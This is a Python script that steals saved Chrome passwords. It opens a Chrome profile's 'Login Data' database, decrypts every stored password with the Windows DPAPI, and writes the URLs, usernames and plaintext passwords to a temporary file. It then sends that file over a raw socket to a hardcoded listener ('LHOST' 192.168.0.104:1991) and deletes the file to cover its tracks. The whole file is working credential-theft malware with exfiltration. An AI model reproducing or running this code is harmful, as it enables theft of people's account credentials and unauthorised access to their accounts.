'''
Created on 19 Jun 2015

@author: Jordan Wright <jordan-wright.github.io>    +    Robyn Hode
https://docs.python.org/3/library/socket.html#socket.socket.shutdown
'''
from os import getenv
from os import remove
import sqlite3
import win32crypt
import socket
import struct


HOST = '192.168.0.104'
PORT = 1991

default_user = r'\..\Local\Google\Chrome\User Data\Default\Login Data'
profile1_user = r'\..\Local\Google\Chrome\User Data\Profile 1\Login Data'
profile2_user = r'\..\Local\Google\Chrome\User Data\Profile 2\Login Data'

passfilename = "passwordsdecrypt.db"


def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)


def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)


def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


# Open and decrypt login data
try:
    conn = sqlite3.connect(getenv("APPDATA") + profile1_user)
    conn2 = sqlite3.connect(passfilename)

    cursor = conn.cursor()
    cursor2 = conn2.cursor()

    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    cursor2.execute('''CREATE TABLE passwords(url, username, password)''')

    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(
            result[2], None, None, None, 0)[1]
        url = result[0]
        username = result[1]
        if password:
            cursor2.execute(
                "INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (url, username, password))
            conn2.commit()

except Exception as e:
    print(e)
finally:
    conn.close()
    conn2.close()

# Connect LHOST and send login_data
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        binary_data = None
        with open(passfilename, 'rb') as passfile:
            binary_data = passfile.read()
        if binary_data:
            send_msg(s, binary_data)
            # data = recv_msg(s)
            # print('Received', repr(data))

except Exception as e:
    print(e)

# Remove db
try:
    remove(passfilename)
except Exception as e:
    print(e)
